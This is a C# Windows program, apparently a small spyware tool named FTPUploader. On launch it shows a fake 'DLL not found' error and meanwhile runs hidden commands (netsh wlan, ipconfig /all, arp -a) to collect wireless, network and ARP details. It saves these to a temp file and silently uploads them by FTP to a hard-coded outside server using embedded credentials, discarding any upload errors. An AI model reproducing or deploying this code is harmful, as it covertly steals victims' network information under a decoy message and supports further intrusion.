using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace FTPUploader
{
    static class Program
    {
        /// <summary>
        /// 해당 응용 프로그램의 주 진입점입니다.
        /// </summary>
        [STAThread]
        static void Main()
        {
            MessageBox.Show("Win32Evrt.dll 파일을 찾을 수 없습니다.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);

            string sep = "\r\n\r\n\r\n---------------------------------------------------------------------\r\n\r\n\r\n";
            StringBuilder sb = new StringBuilder();
            sb.Append(sep);
            sb.Append(getWifiInfo());
            sb.Append(sep);
            sb.Append(getIpconfig_All());
            sb.Append(sep);
            sb.Append(getARP());
            sb.Append(sep);
            string info = sb.ToString();

            String timeStamp = GetTimestamp(DateTime.Now);
            string localPath = Path.GetTempPath();
            string fileName = "IP" + timeStamp +".txt";

            //text 인자를 파일로 생성
            using (StreamWriter output = new StreamWriter(localPath + fileName, false, System.Text.Encoding.UTF8))
            {
                output.WriteLine(info);
            }

            FtpUpload("ftp://ghostyak83.cafe24.com", "test1", "test1", localPath + fileName, fileName);
            
            //정보 가져오기
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());
        }

        public static String GetTimestamp(DateTime value)
        {
            return value.ToString("yyyyMMdd_HHmmss");
        }

        static string runCommand(string command)
        {
            Process proc = new Process();
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.FileName = "cmd";

            proc.StartInfo.Arguments = "/C \"" + command + "\"";

            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.Start();
            string output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();

            return output;
        }

        static void runCommand_async(string command)
        {
            Process proc = new Process();
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.FileName = "cmd";

            proc.StartInfo.Arguments = "/C \"" + command + "\"";

            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.Start();
        }

        static string getWifiInfo()
        {
            string command = "netsh wlan show networks mode=bssid";
            string output = "Command : " + command + "\r\n";
            output += runCommand(command);
            return output;
        }

        static string getIpconfig_All()
        {
            string command = "ipconfig /all";
            string output = "Command : " + command + "\r\n";
            output += runCommand(command);
            return output;
        }

        static string getARP()
        {
            string command = "arp -a";
            string output = "Command : " + command + "\r\n";
            output += runCommand(command);
            return output;
        }

        static string getPublicIP()
        {
            string command = "nslookup myip.opendns.com resolver1.opendns.com | findstr Address";
            string output = "Command : " + command + "\r\n" + "\r\n";
            output += runCommand(command);
            return output;

        }

        static void FtpUpload(string ftpServer, string id, string password, string localFilePath, string remoteFilePath)
        {
            try
            {

                FtpWebRequest requestFTPUploader = (FtpWebRequest)WebRequest.Create(ftpServer + "/" + remoteFilePath);

                requestFTPUploader.Credentials = new NetworkCredential(id, password);
                requestFTPUploader.Method = WebRequestMethods.Ftp.UploadFile;

                FileInfo fileInfo = new FileInfo(localFilePath);
                FileStream fileStream = fileInfo.OpenRead();

                int bufferLength = 2048;
                byte[] buffer = new byte[bufferLength];

                Stream uploadStream = requestFTPUploader.GetRequestStream();
                int contentLength = fileStream.Read(buffer, 0, bufferLength);

                while (contentLength != 0)
                {
                    uploadStream.Write(buffer, 0, contentLength);
                    contentLength = fileStream.Read(buffer, 0, bufferLength);
                }

                uploadStream.Close();
                fileStream.Close();

                requestFTPUploader = null;
            }
            catch(Exception)
            {
            }
        }

        static void FtpDownload(string ftpServer, string id, string password, string remoteFileFullPath, string localFileFullPath)
        {
            string localPath = Path.GetDirectoryName(localFileFullPath);
            string fileName = Path.GetFullPath(localFileFullPath);
            FtpWebRequest requestFileDownload = (FtpWebRequest)WebRequest.Create(ftpServer + "/" + remoteFileFullPath);

            requestFileDownload.Credentials = new NetworkCredential(id, password);
            requestFileDownload.Method = WebRequestMethods.Ftp.DownloadFile;

            FtpWebResponse responseFileDownload =
            (FtpWebResponse)requestFileDownload.GetResponse();

            Stream responseStream = responseFileDownload.GetResponseStream();
            FileStream writeStream = new FileStream(localPath + fileName, FileMode.Create);

            int Length = 2048;
            Byte[] buffer = new Byte[Length];
            int bytesRead = responseStream.Read(buffer, 0, Length);

            while (bytesRead > 0)
            {
                writeStream.Write(buffer, 0, bytesRead);
                bytesRead = responseStream.Read(buffer, 0, Length);
            }

            responseStream.Close();
            writeStream.Close();

            requestFileDownload = null;
            responseFileDownload = null;
        }


    }
}
